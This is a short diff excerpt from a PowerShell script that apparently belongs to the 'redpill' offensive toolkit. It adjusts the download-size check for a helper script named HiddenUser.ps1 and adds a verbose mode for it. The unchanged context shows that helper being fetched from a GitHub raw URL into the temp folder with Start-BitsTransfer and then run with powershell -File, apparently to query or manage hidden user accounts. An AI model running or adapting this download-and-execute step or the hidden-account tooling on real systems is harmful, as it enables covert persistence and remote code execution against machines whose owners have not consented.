@@ -2241,7 +2241,7 @@ If($HiddenUser -ne "false"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/HiddenUser.ps1 -Destination $Env:TMP\HiddenUser.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\HiddenUser.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 13){## Corrupted download detected => DefaultFileSize: 13,6630859375/KB
+      If($SizeDump -lt 14){## Corrupted download detected => DefaultFileSize: 14,6298828125/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\HiddenUser.ps1"){Remove-Item -Path "$Env:TMP\HiddenUser.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -2258,6 +2258,18 @@ If($HiddenUser -ne "false"){
       }Else{## Query Sellected user account
 
          powershell -File "$Env:TMP\HiddenUser.ps1" -Action Query -UserName "$UserName"
+
+      }
+
+   }ElseIf($HiddenUser -ieq "verbose"){
+
+      If(-not($UserName) -or $UserName -ieq "false"){
+
+         powershell -File "$Env:TMP\HiddenUser.ps1" -Action Verbose
+
+      }Else{## Query Sellected user account
+
+         powershell -File "$Env:TMP\HiddenUser.ps1" -Action Verbose -UserName "$UserName"
 
       }
 
